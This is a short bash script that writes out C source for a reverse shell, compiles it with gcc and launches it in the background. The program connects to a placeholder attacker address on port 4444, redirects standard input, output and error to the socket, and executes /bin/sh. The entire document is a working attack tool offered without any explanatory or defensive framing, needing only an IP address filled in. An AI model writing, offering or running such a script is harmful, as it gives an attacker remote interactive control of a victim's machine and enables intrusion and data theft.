#!/bin/bash

# Write the C code to a temporary file
cat <<EOF > reverse_shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;
    char *shell[] = {"/bin/sh", NULL};

    // Create the socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        printf("Could not create socket\n");
        return 1;
    }

    // Define the server address
    server.sin_addr.s_addr = inet_addr("YOUR_IP_ADDRESS"); // Replace with actual IP
    server.sin_family = AF_INET;
    server.sin_port = htons(4444); // Replace with desired port

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connection failed\n");
        return 1;
    }

    // Redirect standard input/output/error to the socket
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Execute the shell
    execve(shell[0], shell, NULL);

    return 0;
}
EOF

# Compile the C program
gcc -o reverse_shell reverse_shell.c

# Check if compilation was successful
if [ $? -eq 0 ]; then
    echo "Compilation successful. Running the reverse shell..."
    
    # Run the reverse shell in the background
    ./reverse_shell &
    
    echo "Reverse shell launched."
else
    echo "Compilation failed. Exiting..."
    exit 1
fi